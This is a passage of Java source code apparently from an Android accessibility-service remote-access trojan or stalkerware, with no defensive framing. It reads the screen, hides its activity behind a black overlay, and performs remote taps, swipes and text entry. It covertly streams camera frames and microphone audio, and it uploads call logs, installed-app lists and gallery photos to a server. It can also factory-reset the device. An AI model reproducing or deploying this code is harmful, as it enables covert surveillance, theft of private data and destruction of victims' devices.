    private List<SkeletonEntry> printVisibleViewSkeleton(AccessibilityNodeInfo nodeInfo) {
        List<SkeletonEntry> skeletonEntryList = new ArrayList<>();
        try {
            if (nodeInfo == null || !nodeInfo.isVisibleToUser()) return skeletonEntryList;
            String type;
            switch (nodeInfo.getClassName() != null ? nodeInfo.getClassName().toString() : "") {
                case "android.widget.TextView":
                    type = "text";
                    break;
                case "android.widget.Button":
                    type = "button";
                    break;
                case "android.widget.EditText":
                    type = "edit";
                    break;
                case "android.view.View":
                    type = "view";
                    break;
                case "android.widget.FrameLayout":
                    type = "framelayout";
                    break;
                case "android.widget.ImageView":
                    type = "imageview";
                    break;
                case "com.google.android.material.bottomsheet.a":
                    type = "bottomsheet";
                    break;
                case "android.view.ViewGroup":
                    type = "viewgroup";
                    break;
                default:
                    type = "unknown";
                    break;
            }

            if (!type.equals("unknown")) {
                String text = nodeInfo.getText() != null ? nodeInfo.getText().toString() :
                        (nodeInfo.getContentDescription() != null ? nodeInfo.getContentDescription().toString() : "");
                Rect rect = new Rect();
                nodeInfo.getBoundsInScreen(rect);
                skeletonEntryList.add(new SkeletonEntry(text, type, rect.left, rect.top, rect.width(), rect.height()));
            }

            // Recursively process child nodes and collect their results
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                skeletonEntryList.addAll(printVisibleViewSkeleton(nodeInfo.getChild(i)));
            }
        } catch (Exception exception) {
            Log.e("Acc", "Error in esqueletoView: " + exception.getLocalizedMessage());
            exception.printStackTrace();
        }

        return skeletonEntryList;  // Return the collected list of skeleton entries
    }

    @Override
    public void onInterrupt() {

    }

    public void makeBlackScreen() {
        if (overlayView == null) {
            overlayView = new View(this);
            overlayView.setBackgroundColor(0xFF000000); // Black color
            overlayView.getBackground().setAlpha(252);
            loadingTextView = new TextView(this);
            loadingTextView.setTextColor(Color.BLUE);
            loadingTextView.setText(txtBlack);
            loadingTextView.setTextSize(24);
            loadingTextView.setGravity(Gravity.CENTER);
            loadingTextView.setPadding(0,0,0,150);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    deviceHeight + 300,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.CENTER;
            windowManager.addView(overlayView, params);
            windowManager.addView(loadingTextView, params);
            blackScreen = true;
        }
    }

    public void removeBlackScreen() {
        if(overlayView != null) {
            windowManager.removeView(overlayView);
            windowManager.removeView(loadingTextView);
            overlayView = null;
            blackScreen = false;
        }
    }

    public void performClick(double x, double y) {
        double currentXPosition = x * deviceWidth / imageWidth;
        double currentYPosition = y * deviceWidth / imageWidth;
        Log.d("currentXPosition", String.valueOf(currentXPosition));
        Log.d("currentYPosition", String.valueOf(currentYPosition));
        Path clickPath = new Path();
        clickPath.moveTo((float) currentXPosition, (float) currentYPosition);

        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 1);
        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();

        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d(TAG, "Click performed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void performClickMain(double x, double y) {
        Path clickPath = new Path();
        clickPath.moveTo((float) x, (float) y);

        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 1);
        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();

        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d(TAG, "Click performed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void mouseDraw() {
        Log.d("deviceWidth", String.valueOf(deviceWidth));
        Log.d("deviceHeight", String.valueOf(deviceHeight));
        List<MousePositionEntry> mousePositionEntryList = Common.getInstance().getMousePositionEntries();
        Path path = new Path();
        path.moveTo((float) mousePositionEntryList.get(0).getxPosition() * deviceWidth / imageWidth, (float) mousePositionEntryList.get(0).getyPosition() * deviceWidth / imageWidth);
        for (int i2 = 1; i2< mousePositionEntryList.size(); i2++) {
            try {
                if (mousePositionEntryList.get(i2).getxPosition() >= 0.0 && mousePositionEntryList.get(i2).getyPosition() > 0.0) {
                    path.lineTo((float) mousePositionEntryList.get(i2).getxPosition() * deviceWidth / imageWidth, (float) mousePositionEntryList.get(i2).getyPosition() * deviceWidth / imageWidth);
                }
            } catch (Exception unused) {
                unused.printStackTrace();
            }
        }

        GestureDescription.StrokeDescription dragStroke = new GestureDescription.StrokeDescription(path, 0, 100);
        GestureDescription dragGesture = new GestureDescription.Builder().addStroke(dragStroke).build();

        boolean result = dispatchGesture(dragGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d(TAG, "Click performed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    private void inputText(String text) {
        if (focusedNode != null && focusedNode.getClassName().equals("android.widget.EditText") && isEditable) {
            // Use ACTION_SET_TEXT to input text into the focused EditText
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        }
    }

    public void registerBackCameraCaptureManager() {
        orientations.append(Surface.ROTATION_90, 0);
        orientations.append(Surface.ROTATION_180, 1);
        orientations.append(Surface.ROTATION_270, 2);
        orientations.append(Surface.ROTATION_0, 3);

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
    }

    @SuppressLint("MissingPermission")
    private void setupCamera() {
        stopBackgroundThread();
        startBackgroundThread();
        Log.d("tested", "test");
        try {
            String cameraID = cameraManager.getCameraIdList()[0];
            if (cameraType.equals("frontCamera")) {
                cameraID = cameraManager.getCameraIdList()[1];
            }
            cameraManager.openCamera(cameraID, cameraStateCallback, backgroundHandler);
        } catch (CameraAccessException e) {
            throw new RuntimeException(e);
        }
    }
    private final CameraDevice.StateCallback cameraStateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            // Handle camera opened
            Log.d("test:::", "Camera open");
            cameraDevice = camera;
            imageReader_back = ImageReader.newInstance(400, 400, ImageFormat.JPEG, 2);
            imageReader_back.setOnImageAvailableListener(onBackImageAvailableListener, backgroundHandler);
            List<Surface> outputSurface = new ArrayList<>();
            outputSurface.add(imageReader_back.getSurface());
            try {
                cameraDevice.createCaptureSession(outputSurface, new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        captureSession = session;
                        startCaptureRequest();
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {

                    }
                }, backgroundHandler);
            } catch (CameraAccessException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice cameraDevice) {
            // Handle camera disconnected
            Log.d("test:::", "Camera close");
        }

        @Override
        public void onError(@NonNull CameraDevice cameraDevice, int error) {
            String errorMsg;
            switch (error) {
                case CameraDevice.StateCallback.ERROR_CAMERA_DEVICE:
                    errorMsg = "Fatal (device)";
                    break;
                case CameraDevice.StateCallback.ERROR_CAMERA_DISABLED:
                    errorMsg = "Device policy";
                    break;
                case CameraDevice.StateCallback.ERROR_CAMERA_IN_USE:
                    errorMsg = "Camera in use";
                    break;
                case CameraDevice.StateCallback.ERROR_CAMERA_SERVICE:
                    errorMsg = "Fatal (service)";
                    break;
                case CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE:
                    errorMsg = "Maximum cameras in use";
                    break;
                default:
                    errorMsg = "Unknown";
                    break;
            }
            Log.e("Error:::", "Error when trying to connect camera " + errorMsg);
        }
    };
    ImageReader.OnImageAvailableListener onBackImageAvailableListener = new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, bitmap.getWidth(), bitmap.getHeight(), true);

                // Compress the Bitmap to JPEG format with 50% quality
                try {
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        resizedBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, qualityCamera, byteArrayOutputStream);
                    } else {
                        resizedBitmap.compress(Bitmap.CompressFormat.WEBP, qualityCamera, byteArrayOutputStream);
                    }

                    // Encode the compressed Bitmap to base64
                    byte[] compressedBytes = byteArrayOutputStream.toByteArray();
                    String base64Image = Base64.encodeToString(compressedBytes, Base64.DEFAULT);
                    sendBackCameraMonitoringData(base64Image);
                    byteArrayOutputStream.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                image.close();
            }
        }
    };

    private void startCaptureRequest() {
        if(cameraDevice != null) {
            try {
                CaptureRequest.Builder captureRequestBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                captureRequestBuilder.addTarget(imageReader_back.getSurface());
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraDevice.getId());
                int minExposure = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE).getLower();
                int maxExposure = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE).getUpper();

                captureRequestBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, (minExposure + maxExposure) / 2);

//            captureRequestBuilder.set(CaptureRequest.JPEG_ORIENTATION, orientations.get(0));
                captureSession.setRepeatingRequest(captureRequestBuilder.build(), null, backgroundHandler);
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }
    }
    private void closeCamera() {
        Log.d("log::", "Close Camera");
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (imageReader_back != null) {
            imageReader_back.close();
            imageReader_back = null;
        }
    }

    private void getCallDetails() {
        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                String callType;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "Incoming";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "Outgoing";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "Missed";
                        break;
                    case CallLog.Calls.VOICEMAIL_TYPE:
                        callType = "Voicemail";
                        break;
                    case CallLog.Calls.REJECTED_TYPE:
                        callType = "Rejected";
                        break;
                    case CallLog.Calls.BLOCKED_TYPE:
                        callType = "Blocked";
                        break;
                    case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                        callType = "Answered Externally";
                        break;
                    default:
                        callType = "Unknown";
                        break;
                }

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(date));
                CallLogEntry callLogEntry = new CallLogEntry(number, callType, dateString, duration);
                callLogList.add(callLogEntry);
                Log.d("CallLog", "Number: " + number + ", Type: " + callType + ", Date: " + dateString + ", Duration: " + duration + " seconds");
            }
            if (callLogList.size() > 0 && Server.getContext() != null){
                Server.getContext().sendCallLogger(callLogList);
                callLogList.clear();
            }
            cursor.close();
        }
    }

    public void getInstalledAppList() {
        PackageManager packageManager = getPackageManager();
        List<ApplistEntry> installedApps = InstalledApps.getInstalledApps(packageManager);
        if(Server.getContext() != null) {
            Server.getContext().sendInstalledAppList(installedApps);
        }
    }

    private void getAllImages() {
        List<ImageData> imageList = new ArrayList<>();

        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        ContentResolver contentResolver = getContentResolver();
        try (Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder)) {
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    String filePath = cursor.getString(dataColumn);
                    imageList.add(new ImageData(id, filePath));
                    Log.d("filepath::", filePath);
                }
            }
        }
        if(imageList.size() > 0 && Server.getContext() != null) {
            Server.getContext().SendAllGallery(imageList);
        }
    }

    private void getOneImageData(String filePath) {
        Bitmap bitmap = BitmapFactory.decodeFile(filePath);
        if (bitmap != null) {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmap.getHeight() * (360.0 / bitmap.getWidth())), true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, byteArrayOutputStream);
            } else {
                scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, byteArrayOutputStream);
            }
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            // Convert bitmap to Base64
            String base64Image = Base64.encodeToString(byteArray, Base64.DEFAULT);
            Log.d("base64::", "GalleryImage" + "base64Image");
            if(Server.getContext() != null) {
                Server.getContext().SendOneGallery(base64Image);
            }
        }
    }

    private void stopRecording() {
        isRecording = false;
    }
    private void startRecording() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, BUFFER_SIZE);
        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
            Log.e("AudioRecord", "AudioRecord initialization failed");
            return;
        }

        audioRecord.startRecording();
        isRecording = true;

        new Thread(() -> {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[BUFFER_SIZE];
            while (isRecording) {
                int read = audioRecord.read(buffer, 0, buffer.length);
                if (read > 0) {
                    Log.d("Audio111::", Arrays.toString(buffer));
                    sendMicMonitoringData(buffer);

                } else {
                    Log.e("AudioRecord", "AudioRecord read failed: " + read);
                }
            }

            try {
                byteArrayOutputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            audioRecord.stop();
            audioRecord.release();
        }).start();
    }

    public void performFactoryReset() {

        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (mDevicePolicyManager.isDeviceOwnerApp(getPackageName())) {
            mDevicePolicyManager.wipeData(0);
        }
    }

    private void onGoHome() {
        performGlobalAction(GLOBAL_ACTION_HOME);
    }

    private void onGoBack() {
        performGlobalAction(GLOBAL_ACTION_BACK);
    }

    private void onGoRecent() {
        performGlobalAction(GLOBAL_ACTION_RECENTS);
    }




    //Send Data part
    public void sendScreenMonitoringData(String base64Image) {
        screenBase64 = base64Image;
        Log.d("base64Image:::", "screenBase64");
        if (Server.getContext() != null) {
            Server.getContext().sendScreenMonitoring(base64Image);
        }
    }

    public void sendBackCameraMonitoringData(String base64Image) {
        Log.d("Camera:::", "base64Image");
        if(Server.getContext() != null) {
            Server.getContext().sendCameraMonitoring(base64Image, qualityCamera, cameraType);
        }
    }
    public void sendMicMonitoringData(byte[] bufferData) {
        Log.d("sendBackCameraMonitoringData::", "bufferData");
        if(Server.getContext() != null) {
            Server.getContext().sendMicMonitoring(bufferData);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        closeCamera();
        unregisterReceiverManager();
        unsetMediaProjection();
    }

    private void unregisterReceiverManager() {
        unregisterReceiver(screenMonitorReceiver);
        unregisterReceiver(mediaProjectionReceiver);
        unregisterReceiver(batteryReceiver);
    }

    private void unsetMediaProjection() {
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        if (imageReader != null) {
            imageReader.close();
        }
    }
}
